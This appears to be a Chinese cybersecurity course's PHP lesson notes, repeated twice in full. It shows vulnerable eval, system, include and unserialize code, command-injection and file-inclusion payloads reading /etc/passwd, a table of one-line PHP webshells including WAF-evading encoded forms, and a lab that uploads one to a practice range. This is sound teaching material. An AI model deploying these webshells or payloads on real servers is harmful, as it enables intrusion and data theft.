---
title: php
date: 2026-04-22 22:32:46
tags: [技术]
categories: 技术
---






# Day3 前置基础知识-PHP (一)

> **本节目标：**
>
> - 掌握 PHP 最基础语法结构
> - 理解变量、输入获取与输出机制
> - 认识高危函数及其在攻击中的典型用途
> - 了解“一句话木马”是什么？有哪些常见形态？
> - 搭建可运行的本地实验环境（小皮面板）

------

## 1.什么是 PHP？为什么它对网络安全如此重要？

### 1.1 PHP 是什么？

PHP（Hypertext Preprocessor）是一种服务器端脚本语言，用于生成动态网页内容。当你访问一个网站时，如果页面内容是根据用户行为变化的（如登录状态、文章列表、搜索结果），背后很可能就是 PHP 在工作。

PHP 文件以 `.php` 为扩展名，代码嵌入 HTML 中，在服务器上执行后将结果发送给浏览器。

### 1.2 为什么学 PHP 对网络安全至关重要？

因为：

- **大多数 Web 漏洞源于不安全的 PHP 代码逻辑**
- 黑客利用的 WebShell（木马）、反序列化链、命令执行点……几乎都藏在 PHP 脚本中-
- 学会读 PHP = 学会看懂漏洞代码 = 能审计、能防御、能溯源

📌 **举个例子：**

```php
<?php
echo $_GET['name'];  // 用户输入直接输出 → XSS 温床
?>
```

这行代码看似无害，实则可能被用来弹出你的 cookie，甚至控制你的账号！

------

## 2. 环境搭建 —— 使用「小皮面板」一键部署 PHP 环境

### 2.1 推荐工具：小皮面板（原名 phpStudy Pro）

- 官方下载地址：https://www.xp.cn/download.html
- 支持系统：Windows 7/10/11（推荐使用 Win10 及以上）
- 功能特点：
  - 一键安装 Apache + MySQL + PHP
  - 图形化界面操作简单
  - 支持多版本 PHP 切换（5.2 ~ 8.3）
  - 内置常用扩展（mysqli、gd、openssl 等）

### 2.2 快速安装与启动步骤：

1. 下载 `phpstudy_pro.exe` 并安装

2. 打开软件主界面 → 启动【Apache】和【MySQL】服务

3. 将你的 PHP 文件放入网站根目录，例如：

   ```none
   D:\phpstudy_pro\WWW
   ```

4. 浏览器访问：

   ```none
   http://localhost/test.php
   ```

> 提示：你可以在面板中添加多个站点，方便管理不同项目。

------

## 3. 第一个 PHP 程序 —— Hello World

### 3.1 创建 `hello.php`

```php
<?php
// 这是一个注释
echo "Hello, I'm learning PHP!";
print "<br>Welcome to Cybersecurity Lab!";
?>
```

>  浏览器输出：

```none
Hello, I'm learning PHP!
Welcome to Cybersecurity Lab!
```

### 3.2 语法说明：

- `<?php ... ?>`：所有 PHP 代码必须包裹在这对标签内
- `echo` / `print`：输出内容到页面
- `//` 或 `/* */`：注释符号，不会被执行

> ⚠️ 注意：即使是一句简单的 `echo`，如果输出的是用户输入，也可能成为 XSS 攻击的入口！

------

## 4. 变量与数据类型 —— 输入即风险起点

### 4.1 基础语法

```php
$name = "Alice";           // 字符串
$age = 25;                 // 整数
$is_admin = false;         // 布尔值
$scores = [85, 90, 95];    // 数组
```

### 4.2 获取用户输入的三种主要方式

| 方法      | 示例 URL      | PHP 获取方式             |
| :-------- | :------------ | :----------------------- |
| GET 请求  | `?name=Alice` | `$_GET['name']`          |
| POST 请求 | 表单提交      | `$_POST['name']`         |
| COOKIE    | 自动携带      | `$_COOKIE['session_id']` |

### 4.3 实战示例：接收 GET 参数

```php
<?php
// xss.php
$name = $_GET['name'];
echo "Hello, $name!";
?>
```

> 访问 `http://localhost/xss.php?name=Alice` → 输出 `Hello, Alice!`

> 风险提示：这个 `$name` 没有经过任何过滤或转义，黑客可以传入 `<script>alert(1)</script>` 来触发 JavaScript 执行（即 XSS 攻击）。虽然我们后面会详细讲，但现在就要建立“**所有输入都不可信**”的安全意识。

------

## 5. 高危函数详解 —— 黑客最爱用的“武器库”

这些函数本身不是恶意的，但在不当使用下极易导致严重安全问题。必须清楚它们的工作原理和潜在危害。

### 5.1  `eval()` —— “执行任意 PHP 代码”的开关

#### 作用：

将字符串当作 PHP 代码执行。

```php
$code = "echo 'Hello';";
eval($code);  // 输出 Hello
```

#### 极端危险场景：

如果 `eval()` 的参数来自用户输入，则等同于给了黑客一个“命令行”。

```php
<?php
// eval.php
$cmd = $_GET['cmd'];
eval($cmd);  // 黑客可以通过 cmd 参数注入任意代码！
?>
```

> 攻击 payload：

```none
    ?cmd=system('whoami');
```

结果：服务器执行了系统命令，完全失控！

**安全建议：禁止在生产环境中使用 `eval()`！除非你能 100% 控制输入源。**

------

### 5.2 `system()` / `exec()` / `shell_exec()` —— 执行系统命令

#### 作用对比：

| 函数                  | 是否输出结果 | 返回值                           |
| :-------------------- | :----------- | :------------------------------- |
| `system($cmd)`        | 是           | 命令执行结果                     |
| `exec($cmd, $output)` | 否           | 最后一行输出，可通过数组获取全部 |
| `shell_exec($cmd)`    | 否           | 完整输出字符串                   |

#### 示例：

```php
system("dir");                    // Windows 下列出文件
exec("ls -la", $result);          // Linux 下执行并存入数组
$output = shell_exec("pwd");      // 获取当前路径
```

#### 危险性：

若命令拼接了未过滤的用户输入，黑客可注入额外命令。

```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // ❌ 没有过滤
```

> 攻击 payload：

```none
?ip=127.0.0.1; cat /etc/passwd
```

结果：不仅 ping，还泄露了系统用户信息！

**修复方法：**

```php
// 方法1：使用 escapeshellarg() 转义参数
$ip = escapeshellarg($_GET['ip']);
system("ping -c 4 " . $ip);

// 方法2：白名单限制
$allowed = ['127.0.0.1', '8.8.8.8'];
if (in_array($_GET['ip'], $allowed)) {
    system("ping -c 4 " . escapeshellarg($_GET['ip']));
} else {
    die("Invalid IP");
}
```

------

### 5.3 `include()` / `require()` —— 包含外部文件

#### 作用：

动态引入其他 PHP 文件。

```php
include 'config.php';     // 文件不存在时警告继续执行
require 'config.php';     // 文件不存在时报错终止
```

#### 风险点：文件包含漏洞（LFI/RFI）

当包含的文件名由用户控制时，可能导致读取敏感文件或远程执行代码。

```php
<?php
  //include.php
$page = $_GET['page'];
include $page . '.php';  // 如果 page=../../../../etc/passwd → 读取系统文件
?>
```

> 攻击 payload：

```none
?page=../../../../etc/passwd
```

结果：成功读取服务器上的密码文件！

> 想一想，为什么直接输入php看不到输出？
>
> ?page=php://filter/read=convert.base64-encode/resource=flag

 **防御策略：**

- 使用白名单控制允许的页面名称
- 禁止路径穿越字符（如 `../`）
- 不要让用户决定加载哪个文件

------

### 5.4  `unserialize()` —— 反序列化（高级威胁区）

PHP序列化是将**对象/数组转换为字符串**以便存储或传输，反序列化则是将字符串**还原为原来的对象**。

**通俗理解**

就像把乐高积木拆成零件装进盒子（序列化），需要时再拼回原样（反序列化）。

**代码示例**

```php
// 序列化
$user = ['name' => 'admin', 'role' => 'admin'];
$serialized = serialize($user);
// 结果：a:2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// 反序列化
$restored = unserialize($serialized); 
// 结果：['name' => 'admin', 'role' => 'admin']
```

**实际应用**

- Session存储
- Cookie数据
- 缓存对象
- API数据传输

#### 序列化格式示例：

```php
class User {
    public $name = "guest";
}

$user = new User();
$user->name = "Alice";

$serialized = serialize($user);
// 输出：O:4:"User":1:{s:4:"name";s:5:"Alice";}

$unserialized = unserialize($serialized);
```

#### 危险原理：

某些类的魔术方法（如 `__destruct`、`__wakeup`）会在反序列化时自动调用。如果这些方法中调用了危险函数（如 `unlink()`、`system()`），黑客可通过构造恶意序列化字符串实现 RCE。

> CVE-2016-7124：当对象属性数量异常时跳过 `__wakeup()`，但仍执行 `__destruct()`，造成绕过检测。

```php
// 恶意构造的序列化字符串
O:4:"User":1:{s:8:"username";s:5:"admin";}

// 如果类有__destruct()等魔术方法
class User {
    public function __destruct() {
        // 删除文件等危险操作
        unlink($this->username);
    }
}
// 反序列化时会自动执行恶意代码，也就是攻击者控制了传给 unlink() 的参数。
```

#### 真实攻击流程（非常典型）

1.程序存在：

```
$u = unserialize($_POST['data']);
```

2.攻击者构造：

```
O:4:"User":1:{s:8:"username";s:12:"/var/www/a";}
```

3.服务器执行：

```
unlink("/var/www/a");
```

➡️ 文件被删除。

#### 安全要点

**安全原则：不要反序列化不可信的数据！**

------

## 6. 一句话木马 —— WebShell 的“最小单元”

### 6.1 什么是“一句话木马”？

> 是一种极简的 PHP 脚本，仅一行代码即可实现远程代码执行能力，常用于上传后维持访问权限。

它通常通过文件上传漏洞、配置错误等方式植入服务器，然后配合客户端工具（如蚁剑、冰蝎）进行连接和操作。

### 6.2 常见形式一览表

| 类型              | 示例代码                                     | 特点说明                                    |
| :---------------- | :------------------------------------------- | :------------------------------------------ |
| **GET 型**        | `<?php @eval($_GET['cmd']); ?>`              | 最经典，通过 URL 传参执行命令，易被日志发现 |
| **POST 型**       | `<?php @eval($_POST['cmd']); ?>`             | 更隐蔽，需用工具发包，适合长期驻留          |
| **COOKIE 型**     | `<?php @eval($_COOKIE['c']); ?>`             | 不出现在 URL 或 POST 数据中，极难察觉       |
| **SESSION 型**    | `<?php @eval($_SESSION['payload']); ?>`      | 需先设置 session，适合配合其他漏洞          |
| **Base64 编码型** | `<?php @eval(base64_decode($_GET['d'])); ?>` | 绕过 WAF 关键词检测（如 eval、system）      |
| **异或加密型**    | `<?php $a='...' ^ '...'; @eval($a); ?>`      | 完全混淆代码，静态分析困难                  |

> 🔍 符号说明：

- `@`：抑制错误提示，防止暴露路径或语法问题
- `eval()`：执行传入的 PHP 代码
- `base64_decode()`：解码 Base64 字符串，常用于隐藏 payload

### 6.3 实战演示：创建并测试一句话木马

#### 步骤 1：新建 `shell.php`

```php
<?php
@eval($_GET['cmd']);
?>
```

#### 步骤 2：访问测试

```none
http://localhost/shell.php?cmd=phpinfo();
```

→ 页面显示 PHP 配置信息，说明木马已激活！

#### 步骤 3：尝试执行系统命令

```none
http://localhost/shell.php?cmd=system('whoami');
```

→ 显示当前系统用户身份，证明已获得远程命令执行权限！

> 再次强调：这不是教你制作木马，而是让你学会识别它们！
>
> 在真实渗透测试中，发现此类文件应立即上报；在开发中，必须杜绝此类函数滥用。

### **WebShell 实验要求（精简版）**

本实验分为 **本地环境测试（小皮面板）** 与 **远程靶场测试** 两部分。
分别使用 **浏览器 HackBar（POST 方式）** 和 **蚁剑（AntSword）**，体验一句话木马的上传与使用。

**一、本地环境测试（小皮面板）**

 **1. 在小皮面板根目录放入一句话木马**

目录示例：

```
D:\phpstudy_pro\WWW
```

在该目录创建一个 WebShell：

文件名格式要求：**“姓名缩写.php”**
 例如：

```
zl.php
lx.php
```

文件内容（必须 POST）：

```php
<?php @eval($_POST['cmd']); ?>
```

**2. 使用浏览器（Hackbar）测试**

访问本地地址，如：

```
http://localhost/zl.php
```

使用 HackBar → POST → 填入：

```html
cmd=system('whoami');
```

观察输出

继续执行：

```
cmd=system('dir');
```

查看当前目录内容

**3. 使用蚁剑连接本地 WebShell**

- URL：`http://localhost/zl.php`
- 密码：`cmd`
- 类型：PHP :: Eval

连接成功后，能正常执行命令并看到目录结构

**二、远程靶场测试**

靶场地址：

 **http://113.44.59.124:6001/**

**1. 上传你的 WebShell 文件（与本地一致）**

上传 **你的姓名缩写.php**
 上传成功后靶场会提供访问路径：

例如：

```
http://113.44.59.124:6001/uploads/zl.php
```

**2. 使用浏览器（Hackbar）POST 调用远程 WebShell**

执行命令：

```
ccmd=system('ls /');
```

然后读取 flag：

```
cmd=system('cat /flag.txt');
```

 **3. 使用蚁剑连接远程 WebShell**

- URL：上传后的路径（如 `uploads/zl.php`）
- 密码：`cmd`
- 类型：PHP :: Eval

连接成功后，进入虚拟终端执行：

```
ls /
cat /flag.txt
```

也可以直接翻文件

**实验完成要求（跟下次笔记一起提交内容）**

每位同学提交以下截图：

1. 本地 HackBar 执行 whoami、dir 的截图
2. 本地蚁剑成功连接并执行命令的截图
3. 远程靶场 HackBar 成功获取 flag 的截图
4. 远程蚁剑成功获取 flag 的截图

## 7.后续学习？

- **SQL 注入**：基于 `$_GET` 和 `mysqli_query()` 的拼接漏洞
- **XSS 攻击**：基于 `echo` 未转义输出的反射型/存储型 XSS
- **文件上传漏洞**：如何绕过检测上传 WebShell
- **代码审计实战**：从开源 CMS 中挖掘真实漏洞

# Day3 前置基础知识-PHP (一)

> **本节目标：**
>
> - 掌握 PHP 最基础语法结构
> - 理解变量、输入获取与输出机制
> - 认识高危函数及其在攻击中的典型用途
> - 了解“一句话木马”是什么？有哪些常见形态？
> - 搭建可运行的本地实验环境（小皮面板）

------

## 1.什么是 PHP？为什么它对网络安全如此重要？

### 1.1 PHP 是什么？

PHP（Hypertext Preprocessor）是一种服务器端脚本语言，用于生成动态网页内容。当你访问一个网站时，如果页面内容是根据用户行为变化的（如登录状态、文章列表、搜索结果），背后很可能就是 PHP 在工作。

PHP 文件以 `.php` 为扩展名，代码嵌入 HTML 中，在服务器上执行后将结果发送给浏览器。

### 1.2 为什么学 PHP 对网络安全至关重要？

因为：

- **大多数 Web 漏洞源于不安全的 PHP 代码逻辑**
- 黑客利用的 WebShell（木马）、反序列化链、命令执行点……几乎都藏在 PHP 脚本中-
- 学会读 PHP = 学会看懂漏洞代码 = 能审计、能防御、能溯源

📌 **举个例子：**

```php
<?php
echo $_GET['name'];  // 用户输入直接输出 → XSS 温床
?>
```

这行代码看似无害，实则可能被用来弹出你的 cookie，甚至控制你的账号！

------

## 2. 环境搭建 —— 使用「小皮面板」一键部署 PHP 环境

### 2.1 推荐工具：小皮面板（原名 phpStudy Pro）

- 官方下载地址：https://www.xp.cn/download.html
- 支持系统：Windows 7/10/11（推荐使用 Win10 及以上）
- 功能特点：
  - 一键安装 Apache + MySQL + PHP
  - 图形化界面操作简单
  - 支持多版本 PHP 切换（5.2 ~ 8.3）
  - 内置常用扩展（mysqli、gd、openssl 等）

### 2.2 快速安装与启动步骤：

1. 下载 `phpstudy_pro.exe` 并安装

2. 打开软件主界面 → 启动【Apache】和【MySQL】服务

3. 将你的 PHP 文件放入网站根目录，例如：

   ```none
   D:\phpstudy_pro\WWW
   ```

4. 浏览器访问：

   ```none
   http://localhost/test.php
   ```

> 提示：你可以在面板中添加多个站点，方便管理不同项目。

------

## 3. 第一个 PHP 程序 —— Hello World

### 3.1 创建 `hello.php`

```php
<?php
// 这是一个注释
echo "Hello, I'm learning PHP!";
print "<br>Welcome to Cybersecurity Lab!";
?>
```

>  浏览器输出：

```none
Hello, I'm learning PHP!
Welcome to Cybersecurity Lab!
```

### 3.2 语法说明：

- `<?php ... ?>`：所有 PHP 代码必须包裹在这对标签内
- `echo` / `print`：输出内容到页面
- `//` 或 `/* */`：注释符号，不会被执行

> ⚠️ 注意：即使是一句简单的 `echo`，如果输出的是用户输入，也可能成为 XSS 攻击的入口！

------

## 4. 变量与数据类型 —— 输入即风险起点

### 4.1 基础语法

```php
$name = "Alice";           // 字符串
$age = 25;                 // 整数
$is_admin = false;         // 布尔值
$scores = [85, 90, 95];    // 数组
```

### 4.2 获取用户输入的三种主要方式

| 方法      | 示例 URL      | PHP 获取方式             |
| :-------- | :------------ | :----------------------- |
| GET 请求  | `?name=Alice` | `$_GET['name']`          |
| POST 请求 | 表单提交      | `$_POST['name']`         |
| COOKIE    | 自动携带      | `$_COOKIE['session_id']` |

### 4.3 实战示例：接收 GET 参数

```php
<?php
// xss.php
$name = $_GET['name'];
echo "Hello, $name!";
?>
```

> 访问 `http://localhost/xss.php?name=Alice` → 输出 `Hello, Alice!`

> 风险提示：这个 `$name` 没有经过任何过滤或转义，黑客可以传入 `<script>alert(1)</script>` 来触发 JavaScript 执行（即 XSS 攻击）。虽然我们后面会详细讲，但现在就要建立“**所有输入都不可信**”的安全意识。

------

## 5. 高危函数详解 —— 黑客最爱用的“武器库”

这些函数本身不是恶意的，但在不当使用下极易导致严重安全问题。必须清楚它们的工作原理和潜在危害。

### 5.1  `eval()` —— “执行任意 PHP 代码”的开关

#### 作用：

将字符串当作 PHP 代码执行。

```php
$code = "echo 'Hello';";
eval($code);  // 输出 Hello
```

#### 极端危险场景：

如果 `eval()` 的参数来自用户输入，则等同于给了黑客一个“命令行”。

```php
<?php
// eval.php
$cmd = $_GET['cmd'];
eval($cmd);  // 黑客可以通过 cmd 参数注入任意代码！
?>
```

> 攻击 payload：

```none
    ?cmd=system('whoami');
```

结果：服务器执行了系统命令，完全失控！

**安全建议：禁止在生产环境中使用 `eval()`！除非你能 100% 控制输入源。**

------

### 5.2 `system()` / `exec()` / `shell_exec()` —— 执行系统命令

#### 作用对比：

| 函数                  | 是否输出结果 | 返回值                           |
| :-------------------- | :----------- | :------------------------------- |
| `system($cmd)`        | 是           | 命令执行结果                     |
| `exec($cmd, $output)` | 否           | 最后一行输出，可通过数组获取全部 |
| `shell_exec($cmd)`    | 否           | 完整输出字符串                   |

#### 示例：

```php
system("dir");                    // Windows 下列出文件
exec("ls -la", $result);          // Linux 下执行并存入数组
$output = shell_exec("pwd");      // 获取当前路径
```

#### 危险性：

若命令拼接了未过滤的用户输入，黑客可注入额外命令。

```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // ❌ 没有过滤
```

> 攻击 payload：

```none
?ip=127.0.0.1; cat /etc/passwd
```

结果：不仅 ping，还泄露了系统用户信息！

**修复方法：**

```php
// 方法1：使用 escapeshellarg() 转义参数
$ip = escapeshellarg($_GET['ip']);
system("ping -c 4 " . $ip);

// 方法2：白名单限制
$allowed = ['127.0.0.1', '8.8.8.8'];
if (in_array($_GET['ip'], $allowed)) {
    system("ping -c 4 " . escapeshellarg($_GET['ip']));
} else {
    die("Invalid IP");
}
```

------

### 5.3 `include()` / `require()` —— 包含外部文件

#### 作用：

动态引入其他 PHP 文件。

```php
include 'config.php';     // 文件不存在时警告继续执行
require 'config.php';     // 文件不存在时报错终止
```

#### 风险点：文件包含漏洞（LFI/RFI）

当包含的文件名由用户控制时，可能导致读取敏感文件或远程执行代码。

```php
<?php
  //include.php
$page = $_GET['page'];
include $page . '.php';  // 如果 page=../../../../etc/passwd → 读取系统文件
?>
```

> 攻击 payload：

```none
?page=../../../../etc/passwd
```

结果：成功读取服务器上的密码文件！

> 想一想，为什么直接输入php看不到输出？
>
> ?page=php://filter/read=convert.base64-encode/resource=flag

 **防御策略：**

- 使用白名单控制允许的页面名称
- 禁止路径穿越字符（如 `../`）
- 不要让用户决定加载哪个文件

------

### 5.4  `unserialize()` —— 反序列化（高级威胁区）

PHP序列化是将**对象/数组转换为字符串**以便存储或传输，反序列化则是将字符串**还原为原来的对象**。

**通俗理解**

就像把乐高积木拆成零件装进盒子（序列化），需要时再拼回原样（反序列化）。

**代码示例**

```php
// 序列化
$user = ['name' => 'admin', 'role' => 'admin'];
$serialized = serialize($user);
// 结果：a:2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// 反序列化
$restored = unserialize($serialized); 
// 结果：['name' => 'admin', 'role' => 'admin']
```

**实际应用**

- Session存储
- Cookie数据
- 缓存对象
- API数据传输

#### 序列化格式示例：

```php
class User {
    public $name = "guest";
}

$user = new User();
$user->name = "Alice";

$serialized = serialize($user);
// 输出：O:4:"User":1:{s:4:"name";s:5:"Alice";}

$unserialized = unserialize($serialized);
```

#### 危险原理：

某些类的魔术方法（如 `__destruct`、`__wakeup`）会在反序列化时自动调用。如果这些方法中调用了危险函数（如 `unlink()`、`system()`），黑客可通过构造恶意序列化字符串实现 RCE。

> CVE-2016-7124：当对象属性数量异常时跳过 `__wakeup()`，但仍执行 `__destruct()`，造成绕过检测。

```php
// 恶意构造的序列化字符串
O:4:"User":1:{s:8:"username";s:5:"admin";}

// 如果类有__destruct()等魔术方法
class User {
    public function __destruct() {
        // 删除文件等危险操作
        unlink($this->username);
    }
}
// 反序列化时会自动执行恶意代码，也就是攻击者控制了传给 unlink() 的参数。
```

#### 真实攻击流程（非常典型）

1.程序存在：

```
$u = unserialize($_POST['data']);
```

2.攻击者构造：

```
O:4:"User":1:{s:8:"username";s:12:"/var/www/a";}
```

3.服务器执行：

```
unlink("/var/www/a");
```

➡️ 文件被删除。

#### 安全要点

**安全原则：不要反序列化不可信的数据！**

------

## 6. 一句话木马 —— WebShell 的“最小单元”

### 6.1 什么是“一句话木马”？

> 是一种极简的 PHP 脚本，仅一行代码即可实现远程代码执行能力，常用于上传后维持访问权限。

它通常通过文件上传漏洞、配置错误等方式植入服务器，然后配合客户端工具（如蚁剑、冰蝎）进行连接和操作。

### 6.2 常见形式一览表

| 类型              | 示例代码                                     | 特点说明                                    |
| :---------------- | :------------------------------------------- | :------------------------------------------ |
| **GET 型**        | `<?php @eval($_GET['cmd']); ?>`              | 最经典，通过 URL 传参执行命令，易被日志发现 |
| **POST 型**       | `<?php @eval($_POST['cmd']); ?>`             | 更隐蔽，需用工具发包，适合长期驻留          |
| **COOKIE 型**     | `<?php @eval($_COOKIE['c']); ?>`             | 不出现在 URL 或 POST 数据中，极难察觉       |
| **SESSION 型**    | `<?php @eval($_SESSION['payload']); ?>`      | 需先设置 session，适合配合其他漏洞          |
| **Base64 编码型** | `<?php @eval(base64_decode($_GET['d'])); ?>` | 绕过 WAF 关键词检测（如 eval、system）      |
| **异或加密型**    | `<?php $a='...' ^ '...'; @eval($a); ?>`      | 完全混淆代码，静态分析困难                  |

> 🔍 符号说明：

- `@`：抑制错误提示，防止暴露路径或语法问题
- `eval()`：执行传入的 PHP 代码
- `base64_decode()`：解码 Base64 字符串，常用于隐藏 payload

### 6.3 实战演示：创建并测试一句话木马

#### 步骤 1：新建 `shell.php`

```php
<?php
@eval($_GET['cmd']);
?>
```

#### 步骤 2：访问测试

```none
http://localhost/shell.php?cmd=phpinfo();
```

→ 页面显示 PHP 配置信息，说明木马已激活！

#### 步骤 3：尝试执行系统命令

```none
http://localhost/shell.php?cmd=system('whoami');
```

→ 显示当前系统用户身份，证明已获得远程命令执行权限！

> 再次强调：这不是教你制作木马，而是让你学会识别它们！
>
> 在真实渗透测试中，发现此类文件应立即上报；在开发中，必须杜绝此类函数滥用。

### **WebShell 实验要求（精简版）**

本实验分为 **本地环境测试（小皮面板）** 与 **远程靶场测试** 两部分。
分别使用 **浏览器 HackBar（POST 方式）** 和 **蚁剑（AntSword）**，体验一句话木马的上传与使用。

**一、本地环境测试（小皮面板）**

 **1. 在小皮面板根目录放入一句话木马**

目录示例：

```
D:\phpstudy_pro\WWW
```

在该目录创建一个 WebShell：

文件名格式要求：**“姓名缩写.php”**
 例如：

```
zl.php
lx.php
```

文件内容（必须 POST）：

```php
<?php @eval($_POST['cmd']); ?>
```

**2. 使用浏览器（Hackbar）测试**

访问本地地址，如：

```
http://localhost/zl.php
```

使用 HackBar → POST → 填入：

```html
cmd=system('whoami');
```

观察输出

继续执行：

```
cmd=system('dir');
```

查看当前目录内容

**3. 使用蚁剑连接本地 WebShell**

- URL：`http://localhost/zl.php`
- 密码：`cmd`
- 类型：PHP :: Eval

连接成功后，能正常执行命令并看到目录结构

**二、远程靶场测试**

靶场地址：

 **http://113.44.59.124:6001/**

**1. 上传你的 WebShell 文件（与本地一致）**

上传 **你的姓名缩写.php**
 上传成功后靶场会提供访问路径：

例如：

```
http://113.44.59.124:6001/uploads/zl.php
```

**2. 使用浏览器（Hackbar）POST 调用远程 WebShell**

执行命令：

```
ccmd=system('ls /');
```

然后读取 flag：

```
cmd=system('cat /flag.txt');
```

 **3. 使用蚁剑连接远程 WebShell**

- URL：上传后的路径（如 `uploads/zl.php`）
- 密码：`cmd`
- 类型：PHP :: Eval

连接成功后，进入虚拟终端执行：

```
ls /
cat /flag.txt
```

也可以直接翻文件

**实验完成要求（跟下次笔记一起提交内容）**

每位同学提交以下截图：

1. 本地 HackBar 执行 whoami、dir 的截图
2. 本地蚁剑成功连接并执行命令的截图
3. 远程靶场 HackBar 成功获取 flag 的截图
4. 远程蚁剑成功获取 flag 的截图

## 7.后续学习？

- **SQL 注入**：基于 `$_GET` 和 `mysqli_query()` 的拼接漏洞
- **XSS 攻击**：基于 `echo` 未转义输出的反射型/存储型 XSS
- **文件上传漏洞**：如何绕过检测上传 WebShell
- **代码审计实战**：从开源 CMS 中挖掘真实漏洞